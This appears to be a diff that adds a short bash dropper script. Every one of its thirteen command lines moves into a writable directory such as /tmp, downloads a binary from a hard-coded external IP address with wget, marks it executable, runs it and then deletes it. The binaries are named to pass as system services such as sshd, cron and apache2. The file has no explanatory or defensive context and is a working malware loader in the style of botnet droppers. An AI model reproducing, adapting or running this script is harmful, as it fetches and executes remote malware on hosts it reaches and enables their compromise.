@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2ntpd; chmod +x xm2ntpd; ./xm2ntpd; rm -rf xm2ntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2ssshd; chmod +x xm2ssshd; ./xm2ssshd; rm -rf xm2ssshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2openssh; chmod +x xm2openssh; ./xm2openssh; rm -rf xm2openssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2bash; chmod +x xm2bash; ./xm2bash; rm -rf xm2bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2tftp; chmod +x xm2tftp; ./xm2tftp; rm -rf xm2tftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2wget; chmod +x xm2wget; ./xm2wget; rm -rf xm2wget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2cron; chmod +x xm2cron; ./xm2cron; rm -rf xm2cron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2ftp; chmod +x xm2ftp; ./xm2ftp; rm -rf xm2ftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2pftp; chmod +x xm2pftp; ./xm2pftp; rm -rf xm2pftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2sh; chmod +x xm2sh; ./xm2sh; rm -rf xm2sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2shit; chmod +x xm2shit; ./xm2shit; rm -rf xm2shit
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2apache2; chmod +x xm2apache2; ./xm2apache2; rm -rf xm2apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.47.250/xm2telnetd; chmod +x xm2telnetd; ./xm2telnetd; rm -rf xm2telnetd
